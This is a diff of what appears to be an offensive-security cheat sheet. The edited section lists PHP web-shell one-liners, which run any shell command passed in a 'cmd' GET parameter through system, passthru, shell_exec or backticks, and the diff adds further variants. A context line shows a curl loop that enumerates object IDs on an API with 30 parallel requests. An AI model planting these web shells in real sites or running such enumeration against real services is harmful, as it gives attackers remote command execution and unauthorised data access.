@@ -136,9 +136,11 @@ cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H 
 
 [*] Web Shell
 +---------- One Liners ----------+
-PHP   <?=`$_GET[0]`?>
+PHP   <?=`$_GET[cmd]`?>
       <?php system($_GET['cmd']); ?>
       <?php passthru($_GET['cmd']); ?>
+      <?php shell_exec($_GET['cmd']); ?>
+      <?php echo system($_GET['cmd']); ?>
       <?php echo passthru($_GET['cmd']); ?>
       <?php echo shell_exec($_GET['cmd']); ?>
 
